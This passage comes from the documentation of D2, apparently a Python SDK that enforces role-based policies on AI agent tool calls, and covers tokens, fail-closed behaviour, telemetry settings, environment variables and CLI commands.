- Revocation happens in the dashboard

**Token types** (recommended practice):

- Developer token (includes `policy:write` scope): Get from dashboard. Use in CI/ops to upload drafts and publish policies. Don't ship this with your app.
- Runtime token (read-only): Also from dashboard. Deploy with services to fetch and verify policy bundles.

The SDK doesn't create tokens. Get them from the dashboard (uses `Authorization: Bearer` format).

**What is ETag-aware polling?**

- The control plane returns an `ETag` header (a version fingerprint for the policy bundle)
- The SDK sends `If-None-Match: <etag>` on the next request
- Server responds with `304 Not Modified` if nothing changed
- This avoids re-downloading the same bundle and reduces load

**Failure behavior:**

- If the network or control plane is down, the SDK keeps using the last good bundle from memory
- If no bundle is available or it expired, D2 fails closed (tools are blocked and you'll see `BundleExpiredError` or `MissingPolicyError`, or your `on_deny` fallback runs)
- Plan and app limits: Publishing, drafting, or runtime fetches might fail due to limits:
  - 402 error becomes `D2PlanLimitError` (hit a tool or feature limit)
  - 403 with `detail: quota_apps_exceeded` means account is at max apps (need to upgrade or delete apps)

---

## Telemetry and analytics

D2 sends useful telemetry without extra setup:

**Metrics** go to your OTLP collector (respects `OTEL_EXPORTER_OTLP_ENDPOINT`). You get latency, decision counts, JWKS rotation status, polling health, and more.

**Usage events** go to the D2 Cloud ingest endpoint when `D2_TOKEN` is set. Each event includes tool ID, policy etag, service name, and the exact denial reason if there was one.

**Telemetry modes** (set with `D2_TELEMETRY`):

- `off`: Nothing leaves the process
- `metrics`: OTLP only
- `usage`: Cloud events only
- `all` (default): Both (metrics still no-op if exporter libs aren't installed)

Exporter failures never bubble up. Worst case, we drop the event and keep your app running.

If metrics APIs arrive in the control plane later, tokens will need the `metrics.read` scope alongside `admin`.

### Telemetry and privacy

- Local mode is completely offline. Usage events only flow in cloud mode.
- D2 doesn't change your existing OpenTelemetry setup.
- User IDs you pass to `set_user()` appear as-is in denial events. Hash or change them if needed for compliance.
- ANSI color in the CLI is cosmetic. The library logs plain text.

---

## Environment variables reference

| Variable | Default | What it does |
|----------|---------|--------------|
| `D2_TOKEN` | Not set | When set, enables cloud mode (uses Bearer auth for API and usage). When not set, uses local file mode. |
| `D2_POLICY_FILE` | Auto-discovery | Full or relative path to your local policy file (skips auto-discovery). |
| `D2_TELEMETRY` | `all` | Controls OTLP metrics and raw usage events. Options: `off`, `metrics`, `usage`, `all` |
| `D2_JWKS_URL` | Derived from API URL | Override JWKS endpoint (rarely needed). Cloud mode usually uses `/.well-known/jwks.json` |
| `D2_STRICT_SYNC` | `0` | When `1` (or truthy), disables auto-threading for sync tools in async loops. Makes them fail fast instead. |
| `D2_API_URL` | Default from code | The base URL for the control plane. Currently defaults to `https://d2.artoo.love` |
| `D2_STATE_PATH` | `~/.config/d2/bundles.json` | Path for cached bundle state. Set to `:memory:` to disable caching. |
| `D2_SILENT` | `0` | When `1` (or truthy), suppresses the local mode banner and expiry warnings. |

All of these are implemented in version 1.0 and later.

---

## FAQ and tips

**What happens if I call a sync tool from async code?**

D2 auto-threads the call and returns the real value. No extra code needed. For diagnostics, set `D2_STRICT_SYNC=1` or use `@d2_guard(..., strict=True)` to fail fast instead.

**Where do I define roles?**

In your policy file. A call is allowed when any of the user's roles matches a permission entry. Wildcard `*` is supported.

**How do I avoid context leaks?**

Use `@clear_context` or `@clear_context_async` decorators. Or call `clear_user_context()` in a `finally` block. Use `d2.warn_if_context_set()` in tests to detect leaks.

**How do I control telemetry?**

Set `D2_TELEMETRY` to `off`, `metrics`, `usage`, or `all`.

---

## CLI commands reference

| Command | What it does | Useful flags |
|---------|--------------|--------------|
| `d2 init` | Create a starter local policy at `~/.config/d2/policy.yaml` (scans for `@d2_guard`) | `--path`, `--format`, `--force` |
| `d2 pull` | Download cloud bundle to a file (needs `D2_TOKEN`) | `--output`, `--format` |
| `d2 inspect` | Show permissions and roles (works with cloud or local) | `--verbose` |
| `d2 diagnose` | Check local policy limits (tool count, expiry date) | |
| `d2 draft` | Upload a policy draft (needs token with `policy:write`) | `--version` |
| `d2 publish` | Sign and publish policy (needs token with `policy:write` and device key) | `--dry-run`, `--force` |
| `d2 revoke` | Revoke the latest policy (needs token with appropriate permission) | |

### Publish details

**Authorization:** Uses `Bearer $D2_TOKEN` (token needs `policy:write` scope)


### Key management

Keys are registered automatically on first publish and reused after that. Revocation happens in the dashboard. The CLI doesn't expose key deletion.

### Tokens

The SDK and CLI don't create tokens. Get admin and runtime tokens from the dashboard and supply via `D2_TOKEN`.


---

## Development



### Development workflow

D2 follows a test driven development workflow:
1. Write test cases for what you expect as a result of your new function/feature you're introducing
2. Make changes to the code
3. Run pytest to observe if you have regressions and to see if your unit tests pass as expected
4. Update docs if needed (README.md, EVERYTHING-python.md)
5. Make sure examples work: `python examples/local_mode_demo.py`

---
